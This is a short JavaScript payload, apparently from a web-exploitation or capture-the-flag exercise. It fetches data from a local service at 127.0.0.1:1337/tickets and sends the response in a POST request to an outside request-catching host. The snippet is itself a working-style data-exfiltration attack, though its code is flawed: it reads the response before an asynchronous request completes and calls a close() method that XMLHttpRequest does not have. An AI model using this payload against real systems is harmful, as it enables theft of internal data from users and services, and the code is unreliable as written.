var xhr = new XMLHttpRequest();
xhr.open("GET", "http://127.0.0.1:1337/tickets",true);
xhr.send();
v = xhr.responseText;
xhr.close();

xhr.open("POST", "https://lemon.requestcatcher.com/", true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
data = v;
xhr.send(data);
